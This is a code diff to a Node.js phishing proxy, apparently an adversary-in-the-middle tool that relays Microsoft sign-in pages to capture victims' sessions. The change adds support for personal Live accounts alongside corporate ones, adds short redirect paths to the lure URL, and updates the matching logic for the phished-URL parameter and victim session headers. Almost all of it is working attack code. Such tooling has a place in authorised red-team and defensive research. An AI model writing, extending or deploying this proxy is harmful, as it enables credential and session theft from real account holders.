@@ -6,7 +6,9 @@ const zlib = require("zlib");
 const crypto = require("crypto");
 
 
-const PROXY_ENTRY_POINT = "/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true";
+const PROXY_ENTRY_POINT_BASE = "/login?method=signin&mode=secure&client_id=";
+const CORPORATE_CLIENT_ID = "3ce82761-cb43-493f-94bb-fe444b7a0cc4";
+const PERSONAL_CLIENT_ID = "4765445b-32c6-49b0-83e6-1d93765276ca";
 const PHISHED_URL_PARAMETER = "redirect_urI";
 const PHISHED_URL_REGEXP = new RegExp(`(?<=${PHISHED_URL_PARAMETER}=)[^&]+`);
 const REDIRECT_URL = "https://www.intrinsec.com/";
@@ -52,7 +54,7 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
     if (url === '/c' || url === '/corp' || url === '/corporate') {
         // Redirect to full corporate login URL
         clientResponse.writeHead(302, { 
-            Location: '/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true&redirect_urI=https%3A%2F%2Flogin.microsoftonline.com%2F' 
+            Location: `/login?method=signin&mode=secure&client_id=${CORPORATE_CLIENT_ID}&privacy=on&sso_reload=true&redirect_urI=https%3A%2F%2Flogin.microsoftonline.com%2F` 
         });
         clientResponse.end();
         return;
@@ -61,13 +63,18 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
     if (url === '/p' || url === '/personal') {
         // Redirect to personal login URL (for future use)
         clientResponse.writeHead(302, { 
-            Location: '/login?method=signin&mode=secure&client_id=4765445b-32c6-49b0-83e6-1d93765276ca&privacy=on&sso_reload=true&redirect_urI=https%3A%2F%2Flogin.live.com%2F' 
+            Location: `/login?method=signin&mode=secure&client_id=${PERSONAL_CLIENT_ID}&privacy=on&sso_reload=true&redirect_urI=https%3A%2F%2Flogin.live.com%2F` 
         });
         clientResponse.end();
         return;
     }
 
-    if (url.startsWith(PROXY_ENTRY_POINT) && url.includes(PHISHED_URL_PARAMETER)) {
+    // Check if this is a login URL with either corporate or personal client_id
+    const isLoginUrl = url.startsWith(PROXY_ENTRY_POINT_BASE) && 
+                      (url.includes(`client_id=${CORPORATE_CLIENT_ID}`) || url.includes(`client_id=${PERSONAL_CLIENT_ID}`)) &&
+                      url.includes(PHISHED_URL_PARAMETER);
+    
+    if (isLoginUrl) {
         try {
             const phishedURL = new URL(decodeURIComponent(url.match(PHISHED_URL_REGEXP)[0]));
             let session = currentSession;
@@ -123,7 +130,7 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
                                 const proxyRequestPath = `${proxyRequestURL.pathname}${proxyRequestURL.search}`;
 
                                 if (proxyRequestURL.hostname === headers.host &&
-                                    proxyRequestPath.startsWith(PROXY_ENTRY_POINT) && proxyRequestPath.includes(PHISHED_URL_PARAMETER)) {
+                                    proxyRequestPath.startsWith(PROXY_ENTRY_POINT_BASE) && proxyRequestPath.includes(PHISHED_URL_PARAMETER)) {
                                     try {
                                         const phishedURL = new URL(decodeURIComponent(proxyRequestPath.match(PHISHED_URL_REGEXP)[0]));
 
@@ -186,7 +193,7 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
                                     let proxyRequestPath = `${proxyRequestURL.pathname}${proxyRequestURL.search}`;
 
                                     if (proxyRequestURL.hostname === headers.host) {
-                                        if (proxyRequestPath.startsWith(PROXY_ENTRY_POINT) && proxyRequestPath.includes(PHISHED_URL_PARAMETER)) {
+                                        if (proxyRequestPath.startsWith(PROXY_ENTRY_POINT_BASE) && proxyRequestPath.includes(PHISHED_URL_PARAMETER)) {
                                             try {
                                                 const phishedURL = new URL(decodeURIComponent(proxyRequestPath.match(PHISHED_URL_REGEXP)[0]));
 
@@ -1010,7 +1017,7 @@ function updateProxyRequestHeaders(proxyRequestOptions, currentSession, proxyHos
         proxyRequestOptions.headers.origin = `${VICTIM_SESSIONS[currentSession].protocol}//${VICTIM_SESSIONS[currentSession].host}`;
     }
     if (proxyRequestOptions.headers.hasOwnProperty("referer") &&
-        (!proxyRequestOptions.headers.referer || proxyRequestOptions.headers.referer.includes(PROXY_ENTRY_POINT))) {
+        (!proxyRequestOptions.headers.referer || proxyRequestOptions.headers.referer.includes(PROXY_ENTRY_POINT_BASE))) {
         delete proxyRequestOptions.headers.referer;
     }
 
